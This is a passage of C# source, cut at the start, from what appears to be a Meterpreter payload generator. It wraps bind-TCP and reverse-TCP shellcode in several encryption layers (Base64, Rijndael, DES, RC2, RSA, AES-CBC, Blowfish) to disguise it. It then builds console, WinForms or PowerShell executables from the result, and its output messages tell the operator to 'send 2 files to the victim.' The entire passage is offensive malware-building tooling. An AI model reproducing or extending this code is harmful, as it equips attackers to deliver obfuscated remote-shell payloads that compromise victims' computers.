				byte[] array = x86ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void ShellBindTcpRc4(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellBindTcpRc4(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void x64BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void x64ShellBindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
		}
		public class Powershell
		{
			public string FileName = string.Empty;

			private MeterpreterShellCode.x86ShellString x86ShellCode = new MeterpreterShellCode.x86ShellString();
			private MeterpreterShellCode.x64ShellCode x64ShellCode = new MeterpreterShellCode.x64ShellCode();
			private MeterpreterBuilder builder = new MeterpreterBuilder();
			private BuildCode.PowerShell buildCode = new BuildCode.PowerShell();
			public void ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				string str = x86ShellCode.ReverseTcp(Ip, Port);
				string buffName = GeneralFunction.RandomFileName(0, 9);
				string funcName = GeneralFunction.RandomFileName(0, 8);
				string deffName = GeneralFunction.RandomFileName(0, 7);
				string strName = GeneralFunction.RandomFileName(0, 6);
				bool flag = encryption == 0;
				if (flag)
				{
					FileName = builder.FileName;
					string strCSharpCode = buildCode.NonEncryptionFirstCode(strName, buffName, funcName, timeOut) + str + " " + buildCode.NonEncryptionLastCode(buffName, funcName, deffName);
					builder.PowerShell(strCSharpCode);
				}
			}
		}
		public class EncrypterMethod
        {
			public string fileName = string.Empty;
			private MeterpreterBuilder builder = new MeterpreterBuilder();
			private BuildCode.Console consoleBuildCode = new BuildCode.Console();
			private BuildCode.Form formBuildCode = new BuildCode.Form();
			public void NonEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if(appType == 0)
                {
					var strCSharpCode = string.Concat(new string[]
					{
						consoleBuildCode.NonEncryptionFirstCode(timeOut),
						array.Length.ToString(),
						"] { ",
						GeneralFunction.ByteArrayToString(array),
						consoleBuildCode.NonEncryptionLastCode()
					});
					builder.ConsoleApplication(strCSharpCode, arch);
				}
				else if(appType == 1)
                {
					var strCSharpCode = string.Concat(new string[]
					{
						formBuildCode.NonEncryptionFirstCode(timeOut),
						array.Length.ToString(),
						"] { ",
						GeneralFunction.ByteArrayToString(array),
						formBuildCode.NonEncryptionLastCode()
					});
					builder.FormApplication(strCSharpCode, arch);
				}
				fileName = builder.FileName;
			}
			public void Base64Encoding(byte[] array, int timeOut, string arch, int appType)
			{
				if(appType == 0)
				{
					var base64Code = Convert.ToBase64String(array);
					var strCSharpCode2 = consoleBuildCode.Base64EncodingFirstCode(timeOut, base64Code) + consoleBuildCode.Base64EncodingLastCode();
					builder.ConsoleApplication(strCSharpCode2, arch);
				}
				else if(appType == 1)
				{
					var base64Code = Convert.ToBase64String(array);
					var strCSharpCode2 = formBuildCode.Base64EncryptionFirstCode(timeOut) + formBuildCode.Base64EncryptionLastCode();
					builder.FormApplication(strCSharpCode2, arch);
				}
				fileName = builder.FileName;
			}
			public void RinjdaelEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if(appType == 0)
				{
					var rijndaRijndael = new Encrypter.Rijndael();
					var input = Convert.ToBase64String(array);
					var text = GeneralFunction.RandomPassword(0, 8);
					var rijndaelCode = rijndaRijndael.EncryptText(input, text);
					var strCSharpCode3 = consoleBuildCode.RijndaelEncryptionFirstCode(timeOut, rijndaelCode) + consoleBuildCode.RijndaelEncryptionLastCode(text);
					builder.ConsoleApplication(strCSharpCode3, arch);
				}
				else if(appType == 1)
				{
                    var rijndaRijndael = new Encrypter.Rijndael();
                    var input = Convert.ToBase64String(array);
                    var text = GeneralFunction.RandomPassword(0, 8);
                    var rijndaelCode = rijndaRijndael.EncryptText(input, text);
                    var strCSharpCode3 = formBuildCode.RijndaelEncryptionFirstCode(timeOut, rijndaelCode) + formBuildCode.RijndaelEncryptionLastCode(text);
					builder.FormApplication(strCSharpCode3, arch);
                }
				fileName = builder.FileName;
			}
			public void DESEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if(appType == 0)
				{
                    var dES = new Encrypter.DES();
                    var strData = Convert.ToBase64String(array);
                    var text2 = GeneralFunction.RandomPassword(0, 8);
                    var desCode = dES.Encrypt(strData, text2);
                    var strCSharpCode4 = consoleBuildCode.DesEncryptionFirstCode(timeOut, desCode) + consoleBuildCode.DesEncryptionLastCode(text2);
					builder.ConsoleApplication(strCSharpCode4, arch);
				}
				else if (appType == 1)
				{
                    var dES = new Encrypter.DES();
                    var strData = Convert.ToBase64String(array);
                    var text2 = GeneralFunction.RandomPassword(0, 8);
                    var desCode = dES.Encrypt(strData, text2);
                    var strCSharpCode4 = formBuildCode.DesEncryptionFirstCode(timeOut, desCode) + formBuildCode.DesEncryptionLastCode(text2);
					builder.FormApplication(strCSharpCode4, arch);
				}
				fileName = builder.FileName;
			}
			public void TripleDESEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if (appType == 0)
				{
                    var tripleDES = new Encrypter.TripleDES();
                    var source = Convert.ToBase64String(array);
                    var text3 = GeneralFunction.RandomPassword(0, 8);
                    var tripleDesCode = tripleDES.Encrypt(source, text3);
                    var strCSharpCode5 = consoleBuildCode.TripleDesEncryptionFirstCode(timeOut, tripleDesCode) + consoleBuildCode.TripleDesEncryptionLastCode(text3);
					builder.ConsoleApplication(strCSharpCode5, arch);
				}
				else if (appType == 1)
				{
                    var tripleDES = new Encrypter.TripleDES();
                    var source = Convert.ToBase64String(array);
                    var text3 = GeneralFunction.RandomPassword(0, 8);
                    var tripleDesCode = tripleDES.Encrypt(source, text3);
                    var strCSharpCode5 = formBuildCode.TripleDesEncryptionFirstCode(timeOut, tripleDesCode) + formBuildCode.TripleDesEncryptionLastCode(text3);
					builder.FormApplication(strCSharpCode5, arch);
				}
				fileName = builder.FileName;
			}
			public void RCTWOEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if (appType == 0)
				{
                    var rCTwo = new Encrypter.RCTwo();
                    var data = Convert.ToBase64String(array);
                    var rC = RC2.Create("RC2");
                    var key = rC.Key;
                    var IV = rC.IV;
					rCTwo.EncryptTextToFile(data, $"iSMETShellCode.txt", key, IV);
                    var strCSharpCode6 = consoleBuildCode.Rc2EncryptionFirstCode(timeOut, $"iSMETShellCode.txt", key, IV) + consoleBuildCode.Rc2EncryptionLastCode();
					builder.ConsoleApplication(strCSharpCode6, arch);
				}
				else if (appType == 1)
				{
                    var rCTwo = new Encrypter.RCTwo();
                    var data = Convert.ToBase64String(array);
                    var rC = RC2.Create("RC2");
                    var key = rC.Key;
                    var IV = rC.IV;
					rCTwo.EncryptTextToFile(data, $"iSMETShellCode.txt", key, IV);
                    var strCSharpCode6 = formBuildCode.Rc2EncryptionFirstCode(timeOut, $"iSMETShellCode.txt", key, IV) + formBuildCode.Rc2EncryptionLastCode();
					builder.FormApplication(strCSharpCode6, arch);
				}
				fileName = $"{builder.FileName}{Environment.NewLine}iSMETShellCode.txt is created. Please send 2 files to the victim.";
			}
			public void RSAEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if (appType == 0)
				{
                    var rSA = new Encrypter.RSA();
					rSA.generateKeys();
                    var publicKey = rSA.publicKey;
                    var privateKey = rSA.privateKey;
                    var encryptedShellCode = rSA.Encrypt(array);
                    var strCSharpCode7 = consoleBuildCode.RsaEncryptionFirstCode(timeOut, array.Length, privateKey, encryptedShellCode) + consoleBuildCode.RsaEncryptionLastCode();
					fileName = string.Concat(new string[]
					{
												builder.FileName,
												Environment.NewLine,
												"Private Key: ",
												privateKey,
												Environment.NewLine,
												"Public Key: ",
												publicKey
					});
					builder.ConsoleApplication(strCSharpCode7, arch);
				}
				else if (appType == 1)
				{
                    var rSA = new Encrypter.RSA();
					rSA.generateKeys();
                    var publicKey = rSA.publicKey;
                    var privateKey = rSA.privateKey;
                    var encryptedShellCode = rSA.Encrypt(array);
                    var strCSharpCode7 = formBuildCode.RsaEncryptionFirstCode(timeOut, array.Length, privateKey, encryptedShellCode) + formBuildCode.RsaEncryptionLastCode();
					fileName = string.Concat(new string[]
					{
												builder.FileName,
												Environment.NewLine,
												"Private Key: ",
												privateKey,
												Environment.NewLine,
												"Public Key: ",
												publicKey
					});
					builder.FormApplication(strCSharpCode7, arch);					
				}
			}
			public void AESCBCEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if (appType == 0)
				{
					var password = GeneralFunction.RandomPassword(0, 8);
					var secret = Encrypter.AESCBC.EncryptStrings(password, GeneralFunction.ByteArrayToString(array));
					File.WriteAllBytes($"{Directory.GetCurrentDirectory()}\\stub.bin", secret);
                    var strAesSharpCode = consoleBuildCode.AESCBCEncryptionCode(timeOut, password);
					builder.ConsoleApplication(strAesSharpCode, arch);
					fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
				}
				else if (appType == 1)
				{
                    var password = GeneralFunction.RandomPassword(0, 8);
					var secret = Encrypter.AESCBC.EncryptStrings(password, GeneralFunction.ByteArrayToString(array));
					File.WriteAllBytes($"{Directory.GetCurrentDirectory()}\\stub.bin", secret);
                    var strAesSharpCode = formBuildCode.AESCBCEncryptionCode(timeOut, password);
					builder.FormApplication(strAesSharpCode, arch);
					fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
                }
			}
			public void BlowFishEncryption(byte[] array, int timeOut, string arch, int appType)
			{
				if (appType == 0)
				{
					var randomIV = GeneralFunction.RandomHexString();
                    var bfish = new Encrypter.BlowFish(randomIV);
					bfish.IV = GeneralFunction.ConvertToByteArray(randomIV);
                    var encryptedShellcode = bfish.Encrypt_CBC(array);
					File.WriteAllBytes($"{Directory.GetCurrentDirectory()}\\stub.bin", encryptedShellcode);
                    var strBlowSharpCode = consoleBuildCode.BlowFishEncryptionFirstCode(timeOut, randomIV);
					builder.ConsoleApplication(strBlowSharpCode, arch);
					fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
				}
				else if (appType == 1)
				{
					var randomIV = GeneralFunction.RandomHexString();
                    var bfish = new Encrypter.BlowFish(randomIV);
					bfish.IV = GeneralFunction.ConvertToByteArray(randomIV);
                    var encryptedShellcode = bfish.Encrypt_CBC(array);
					File.WriteAllBytes($"{Directory.GetCurrentDirectory()}\\stub.bin", encryptedShellcode);
                    var strBlowSharpCode = formBuildCode.BlowFishEncryptionFirstCode(timeOut, randomIV);
					builder.FormApplication(strBlowSharpCode, arch);
					fileName = $"{builder.FileName}{Environment.NewLine}and Stub.bin is created. Please send 2 files to the victim.";
				}
			}

		}
	}
}
